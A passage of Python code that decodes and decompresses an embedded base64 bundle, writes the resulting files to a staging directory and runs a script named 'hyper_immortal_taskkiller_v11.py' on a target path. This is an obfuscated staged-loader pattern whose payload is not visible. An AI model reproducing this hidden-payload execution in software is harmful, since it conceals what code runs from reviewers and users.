            _stages = _js.loads(_zl.decompress(_b64.b64decode(_EMBEDDED_V7_TO_V11_BUNDLE)))
            for _sfn, _scontent in _stages.items():
                with open(os.path.join(_stage_dir, _sfn), "w", encoding="utf-8") as _sf:
                    _sf.write(_scontent)
            subprocess.check_call([sys.executable, os.path.join(_stage_dir, "hyper_immortal_taskkiller_v11.py"), target_path])
